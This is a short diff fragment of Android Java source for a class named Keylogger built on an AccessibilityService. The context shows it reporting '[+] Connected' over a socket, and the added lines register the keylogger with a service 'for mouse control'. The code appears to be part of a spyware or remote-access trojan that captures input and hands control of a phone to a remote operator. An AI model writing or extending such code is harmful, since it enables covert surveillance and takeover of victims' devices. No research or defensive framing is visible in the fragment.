@@ -98,6 +98,8 @@ public class Keylogger extends AccessibilityService {
             if(SCOKET_FLAG && MyService.sock != null){
                 MyService.sock.emit(sockEvt,"[+] Connected");
             }
+            // Register this Keylogger instance with MyService for mouse control
+            MyService.setKeyloggerInstance(this);
         }
         super.onServiceConnected();
     }
